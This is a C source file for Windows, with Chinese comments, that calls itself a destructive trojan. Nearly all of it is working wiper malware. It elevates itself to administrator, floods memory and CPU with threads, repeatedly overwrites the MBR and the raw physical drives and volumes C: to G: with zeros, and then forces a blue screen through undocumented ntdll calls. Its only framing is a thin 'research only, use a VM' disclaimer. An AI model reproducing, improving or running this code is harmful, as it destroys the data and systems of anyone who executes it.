//C的原生的头文件
#include<stdio.h>
#include<stdlib.h>

//操作文件的头文件
#include<dirent.h>
#include<direct.h>

//多线程和多进程的有文件
#include<unistd.h>
#include<process.h>

//使用WindowsAPI获取管理员权限
#include<Windows.h>

//获取管理员权限的函数
VOID Admin_Run(LPCSTR exe, LPCSTR param, INT nShow = SW_HIDE)
{
	SHELLEXECUTEINFO ShExecInfo;
	ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO);
	ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS;
	ShExecInfo.hwnd = NULL;
	ShExecInfo.lpVerb = "runas";
	ShExecInfo.lpFile = exe;
	ShExecInfo.lpParameters = param;
	ShExecInfo.lpDirectory = NULL;
	ShExecInfo.nShow = nShow;
	ShExecInfo.hInstApp = NULL;
	BOOL ret = ShellExecuteEx(&ShExecInfo);
	CloseHandle(ShExecInfo.hProcess);
	return;
}

//占满CPU的线程函数1
void TheCpuKill(void* p) {
	int* a;
	while (1) {
		a = (int*)malloc(1000 * sizeof(int));
	}
}

//占满CPU的线程函数2
void TheCpuKill_func(void* p) {
	while (1) {
		for (int i; i < 800; i++);
	}
}

//对物理磁盘和硬盘进行改写的函数
void TheWriteDisk(void* p) {
	//反复进行改写
	while (1) {
		char TheDiskShell[512] = "\x00\x00\x00\x00\x00";
		//对物理磁盘0(MBR)进行改写
		FILE* WriteMbr = fopen("\\\\.\\PhysicalDrive0", "rb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteMbr);
		//对物理磁盘1进行改写
		FILE* WriteDrive1 = fopen("\\\\.\\PhysicalDrive1", "rb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDrive1);
		//对物理磁盘2进行改写
		FILE* WriteDrive2 = fopen("\\\\.\\PhysicalDrive2", "rb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDrive2);

		//将数据写入磁盘
		fclose(WriteMbr);
		fclose(WriteDrive1);
		fclose(WriteDrive2);
	}
}

//对实际磁盘和硬盘进行改写的函数,用\x00覆盖所有硬盘
void TheWriteDrive(void* p) {
	//反复进行改写
	while (1) {
		char TheDiskShell[512] = "\x00\x00\x00\x00\x00";
		//对C盘进行改写,用\x00格式化C盘
		FILE* WriteDisk_C = fopen("\\\\.\\C:", "wb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_C);
		//对D盘进行改写,用\x00格式化D盘
		FILE* WriteDisk_D = fopen("\\\\.\\D:", "wb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_D);
		//对D盘进行改写,用\x00格式化E盘
		FILE* WriteDisk_E = fopen("\\\\.\\E:", "wb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_E);
		//对D盘进行改写,用\x00格式化F盘
		FILE* WriteDisk_F = fopen("\\\\.\\F:", "wb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_F);
		//对D盘进行改写,用\x00格式化D盘
		FILE* WriteDisk_G = fopen("\\\\.\\G:", "wb+");
		fwrite(TheDiskShell, sizeof(TheDiskShell), 1, WriteDisk_G);
		//进行操作后将所有的数据写入磁盘,硬盘
		fclose(WriteDisk_C); fclose(WriteDisk_D);
		fclose(WriteDisk_E); fclose(WriteDisk_F);
		fclose(WriteDisk_G);
	}
}

void TheWindowsBOSD(void) {
	HMODULE ntdll = LoadLibrary("ntdll.dll");
	FARPROC RtlAdjPriv = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	FARPROC NtRaiseHardErr = GetProcAddress(ntdll, "NtRaiseHardError");
	unsigned char ErrKill;
	long unsigned int HDErr;
	((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
	//蓝屏代码0xffffffff(不存在的代码)
	((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardErr)(0xf0f0f0f0, 0, 0, 0, 6, &HDErr);
}

//提示框的内容
/*
这是一个具有破坏性的特洛伊木马
此程序仅限于学术研究，或者专业测试。
如果对你的计算机造成了损失，本人将不付任何责任。
如果你需要测试此程序请在虚拟机里进行测试。
注：此程序会自动申请提权
*/
int main(int argc, char* argv[]) {
	if (argc == 1) //初次运行，即双击EXE
	{
		Admin_Run(argv[0], "2");
		return 1;
	}
	else if (argc == 2) //再次运行,即上面那个ManagerRun
	{
		if (MessageBox(NULL, "This is a destructive Trojan horse\n\
This program is limited to academic research or professional testing.\n\
If you cause damage to your computer, I will not pay any responsibility.\n\
If you need to test this program, please test it in the virtual machine.\n\r\
Note: This procedure will automatically apply for privilege escalation", "Hello world program", MB_YESNO + 48) == 6) {
			//反复进行操作,让计算机崩溃
			for (int i; i < 20; i++) {
				//创建两个占满RAM的线程
				_beginthread(TheCpuKill, 0, NULL);
				_beginthread(TheCpuKill, 0, NULL);
				//创建两个占满CPU的线程
				_beginthread(TheCpuKill_func, 0, NULL);
				_beginthread(TheCpuKill_func, 0, NULL);

				//创建对物理磁盘进行改写的线程
				_beginthread(TheWriteDisk, 0, NULL);
				//创建对磁盘,硬盘进行改写的线程
				_beginthread(TheWriteDrive, 0, NULL);
			}
			TheWindowsBOSD();
		}
		else { return 0; }
	}
}
